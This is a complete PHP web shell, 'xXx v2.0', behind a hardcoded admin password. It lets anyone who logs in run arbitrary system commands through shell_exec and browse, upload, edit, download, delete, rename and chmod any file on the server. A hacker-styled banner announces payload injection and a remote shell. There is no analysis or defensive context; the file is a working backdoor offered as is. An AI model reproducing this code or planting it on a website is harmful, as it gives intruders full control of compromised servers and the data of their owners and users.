<?php
session_start();
$login_user = "admin";
$login_pass = "kentod";
if (!isset($_SESSION['loggedin'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if ($_POST['user'] === $login_user && $_POST['pass'] === $login_pass) {
            $_SESSION['loggedin'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit();
        } else {
            $error = "Login Gagal Ngentod.";
        }
    }
    echo '<!DOCTYPE html><html><head><title>xXx</title><style>
    body {background:#000;color:#0f0;font-family:monospace;text-align:center;margin-top:20%;}
    input {background:#111;border:1px solid #0f0;color:#0f0;padding:5px;margin:5px;}
    </style></head><body><h1>Login</h1>' . ($error ?? '') . '
    <form method="POST">
    <input type="text" name="user" placeholder="Username"><br>
    <input type="password" name="pass" placeholder="Password"><br>
    <input type="submit" value="Login"></form></body></html>';
    exit();
}

$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
if (!file_exists($path)) $path = getcwd();
chdir($path);
$path = realpath($path);
$files = scandir($path);
usort($files, function($a, $b) use ($path) {
    return (is_dir("$path/$b") <=> is_dir("$path/$a")) ?: strnatcasecmp($a, $b);
});

function perms($file){
    $perms = fileperms($file);
    $info = ($perms & 0x1000) ? 'p' : (($perms & 0x2000) ? 'c' :
           (($perms & 0x4000) ? 'd' : (($perms & 0x6000) ? 'b' :
           (($perms & 0x8000) ? '-' : (($perms & 0xA000) ? 'l' :
           (($perms & 0xC000) ? 's' : 'u'))))));
    $info .= (($perms & 0x0100) ? 'r' : '-') .
             (($perms & 0x0080) ? 'w' : '-') .
             (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : 
                                  (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-') .
             (($perms & 0x0010) ? 'w' : '-') .
             (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : 
                                  (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-') .
             (($perms & 0x0002) ? 'w' : '-') .
             (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : 
                                  (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

if (isset($_POST['cmd'])) {
    echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
}

if (isset($_FILES['upload'])) {
    move_uploaded_file($_FILES['upload']['tmp_name'], $path . '/' . $_FILES['upload']['name']);
}

if (isset($_POST['newfile'])) {
    file_put_contents($path . '/' . $_POST['newfile'], '');
}

if (isset($_POST['newfolder'])) {
    mkdir($path . '/' . $_POST['newfolder']);
}

if (isset($_POST['editfile'])) {
    file_put_contents($_POST['file'], $_POST['content']);
}

if (isset($_GET['delete'])) {
    $target = $_GET['delete'];
    if (is_dir($target)) rmdir($target);
    else unlink($target);
}

if (isset($_GET['download'])) {
    $file = $_GET['download'];
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
    readfile($file);
    exit();
}

if (isset($_POST['rename_from']) && isset($_POST['rename_to'])) {
    rename($_POST['rename_from'], $_POST['rename_to']);
}

if (isset($_POST['chmod_file']) && isset($_POST['chmod_value'])) {
    chmod($_POST['chmod_file'], octdec($_POST['chmod_value']));
}

if (isset($_GET['edit'])) {
    $f = $_GET['edit'];
    if (is_file($f)) {
        $content = htmlspecialchars(file_get_contents($f));
        echo "<!DOCTYPE html><html><head><title>Edit File</title><style>
        body {background:#000;color:#0f0;font-family:monospace;padding:20px;}
        textarea,input {width:100%;background:#111;color:#0f0;border:1px solid #0f0;padding:10px;}
        </style></head><body><h2>Editing: $f</h2>
        <form method='POST'>
        <input type='hidden' name='file' value='$f'>
        <textarea name='content' rows='20'>$content</textarea><br>
        <input type='submit' name='editfile' value='Save'>
        </form></body></html>";
        exit();
    }
}

?>
<!DOCTYPE html><html><head><meta charset="UTF-8"><title>xXx v2.0</title>
<style>
body {margin:0;background:#000 url('https://www.wallpapergap.com/cdn/24/31/opium-label-wallpaper-1920x1080.jpg') no-repeat center center fixed;
background-size:cover;color:#fff;font-family:monospace;}
header {padding:10px;background:rgba(0,0,0,0.8);font-size:18px;color:#0f0;}
#typewriter {display:inline-block;}
.blink {animation:blink 1s step-end infinite;}
@keyframes blink { 50% { opacity: 0; } }
a {color:#0f0;text-decoration:none;}
table {width:100%;background:rgba(0,0,0,0.7);margin-top:10px;border-collapse:collapse;}
th,td {padding:6px;border:1px solid #444;text-align:left;}
form,input,button,textarea,select {margin:5px;padding:5px;background:#111;color:#0f0;border:1px solid #0f0;}
</style></head><body>
<header><span id="typewriter"></span><span class="blink">█</span></header>

<form method="POST"><input name="cmd" placeholder="Command"><input type="submit" value="Exec"></form>
<form method="POST" enctype="multipart/form-data"><input type="file" name="upload"><input type="submit" value="Upload"></form>
<form method="POST"><input name="newfile" placeholder="New File"><input type="submit" value="Create"></form>
<form method="POST"><input name="newfolder" placeholder="New Folder"><input type="submit" value="Create"></form>
<form method="POST">
    <input name="rename_from" placeholder="From"><input name="rename_to" placeholder="To">
    <input type="submit" value="Rename">
</form>
<form method="POST">
    <input name="chmod_file" placeholder="File"><input name="chmod_value" placeholder="755">
    <input type="submit" value="Chmod">
</form>

<table><tr><th>Name</th><th>Size</th><th>Perm</th><th>Type</th><th>Action</th></tr>
<?php foreach ($files as $f): if ($f === '.') continue;
$p = "$path/$f"; $is_dir = is_dir($p); ?>
<tr><td><a href="?path=<?=urlencode($p)?>"><?=$f?></a></td>
<td><?=$is_dir?'--':filesize($p)?></td>
<td><?=perms($p)?></td>
<td><?=$is_dir?'Folder':'File'?></td>
<td>
    <a href="?download=<?=urlencode($p)?>">Download</a> |
    <a href="?delete=<?=urlencode($p)?>" onclick="return confirm('Delete?')">Delete</a> |
    <?php if (!$is_dir): ?>
    <a href="?edit=<?=urlencode($p)?>">Edit</a>
    <?php endif; ?>
</td></tr>
<?php endforeach; ?></table>

<script>
const lines = [
  "root@server:~# scanning /var/www/html...",
  "root@server:~# injecting payload...",
  "root@server:~# executing remote shell...",
  "root@server:~# listing directory...",
  "root@server:~# connected..."
];
let i = 0, c = 0, typeSpeed = 100;
function typeEffect() {
    if (c < lines[i].length) {
        document.getElementById("typewriter").textContent += lines[i].charAt(c++);
        setTimeout(typeEffect, typeSpeed);
    } else {
        setTimeout(() => {
            document.getElementById("typewriter").textContent = "";
            c = 0; i = (i + 1) % lines.length;
            typeEffect();
        }, 1500);
    }
}
typeEffect();
</script>
</body></html>
